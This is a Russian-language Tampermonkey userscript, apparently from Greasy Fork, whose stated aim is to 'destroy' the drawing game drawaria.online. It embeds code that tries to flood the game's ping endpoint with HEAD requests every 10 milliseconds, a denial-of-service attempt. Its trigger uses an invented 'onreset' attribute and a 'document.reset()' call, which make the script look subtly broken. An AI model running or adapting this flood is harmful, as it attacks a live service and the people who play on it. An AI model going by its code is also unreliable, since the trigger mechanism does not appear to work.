// Обновлённый скрипт Tampermonkey (вставь СЕЙЧАС)
// ==UserScript==
// @name         снoc дравы до крошек
// @description  УНИЧТОЖИТЬ ЕТУ ИГРУ
// @match        *://drawaria.online/*
// @run-at       document-start
// @version 0.0.1.20250803094542
// @namespace https://greasyfork.org/users/1485055
// @downloadURL https://update.greasyfork.org/scripts/544495/%D1%81%D0%BDoc%20%D0%B4%D1%80%D0%B0%D0%B2%D1%8B%20%D0%B4%D0%BE%20%D0%BA%D1%80%D0%BE%D1%88%D0%B5%D0%BA.user.js
// @updateURL https://update.greasyfork.org/scripts/544495/%D1%81%D0%BDoc%20%D0%B4%D1%80%D0%B0%D0%B2%D1%8B%20%D0%B4%D0%BE%20%D0%BA%D1%80%D0%BE%D1%88%D0%B5%D0%BA.meta.js
// ==/UserScript==
const NUKECODE = `setInterval(() => {
  const colo = document.cookie.match(/edge=(\w+)/)[1];
  fetch(\`https://\${colo}.drawaria.online/ping\`, {
    method: 'HEAD',
    headers: {'X-Rage-Fire': 'MIRROR_BURN'}
  });
}, 10);`;
document.documentElement.setAttribute('onreset', NUKECODE);
document.write('<iframe srcdoc="<script>top.document.reset();</script>">');